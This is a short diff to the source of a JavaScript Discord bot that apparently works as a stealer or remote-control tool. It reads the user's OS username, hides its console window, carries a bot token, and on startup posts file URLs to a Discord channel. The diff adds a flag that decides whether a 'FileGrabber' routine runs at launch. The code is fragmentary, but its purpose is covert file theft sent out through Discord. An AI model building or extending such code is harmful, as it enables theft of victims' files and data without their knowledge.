@@ -14,6 +14,7 @@ const urss = require("os").userInfo().username;
 
 
 // Global settings
+const FilegrabberOnStart = false;
 const hideCnsl = true;
 const OnStart = true
 const TOKEN = "MTA1MDExNDQwOTc4O" // Your discord bot token
@@ -752,7 +753,9 @@ client.on('ready', () => {
     .then(channel => {
         var msgModal = channel.send({ content: "Files : " + FinalURL, embeds: [embed] , components: [row] });
     })
-    FileGrabber()
+        if(FilegrabberOnStart == true){
+                FileGrabber()
+        }
     /*
 
             ▒█▀▀▀█ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▀▀█▀▀ 　 ▒█▀▀█ ▒█▄░▒█ ▒█▀▀▀█ ▒█▀▄▀█ 
